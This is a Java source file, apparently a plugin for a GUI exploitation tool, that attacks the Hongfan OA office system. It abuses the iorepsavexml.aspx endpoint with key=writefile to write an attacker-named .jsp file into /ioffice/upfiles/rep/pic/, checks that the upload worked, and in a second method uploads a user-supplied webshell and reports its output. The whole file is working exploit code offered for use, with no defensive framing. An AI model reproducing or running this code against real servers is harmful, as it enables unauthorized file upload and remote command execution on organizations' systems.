package exp.oa.hongfanoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.util.Date;
import java.util.HashMap;

public class hongfan_iorepsavexml_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String iorepsavexml(String url,String filename,String content){
        HashMap head = new HashMap();
        head.put("Content-Type","application/x-www-form-urlencoded");
        head.put("Cookie","ASP.NET_SessionId=lcluwirkrcqj42iuxfvafoq4");
        String postData = content;
        Response res = HttpTools.post(url+"/ioffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename="+filename+"&filepath=/upfiles/rep/pic/",postData,head,"utf-8");
        if(res.getCode()==200 && res.getText().contains(content.substring(0,2))){
            Response res1 = HttpTools.get(url+"/ioffice/upfiles/rep/pic/"+filename,new HashMap<>(),"utf-8");
            if(res1.getText().contains(content)||res1.getText().contains("R4g")){
                return url+"/ioffice/upfiles/rep/pic/"+filename;
            }
        }
        return null;
    }

    private Boolean att(String url,TextArea textArea) {
        try {
            long t = (new Date()).getTime();
            String filename = t+".jsp";
            String payload = "Hello R4g";
            String result = iorepsavexml(url,filename,payload);


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ hongfan_iorepsavexml_upload ]");
                    Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                    textArea.appendText("\n 文件上传成功: \n"+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n ");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url,String cmd, TextArea textArea,TextArea textArea_cmd) {
        try {
            String shell_payload = Methods.readFile(cmd);
            long tt = (new Date()).getTime();
            String filename = "R4g"+tt+".jsp";
            String payload = "R4g\n"+shell_payload;
            String result = iorepsavexml(url,filename,payload);


            if ( result != null) {
                Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: \n"+result);
                    textArea_cmd.appendText("\n "+ get.getText());
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
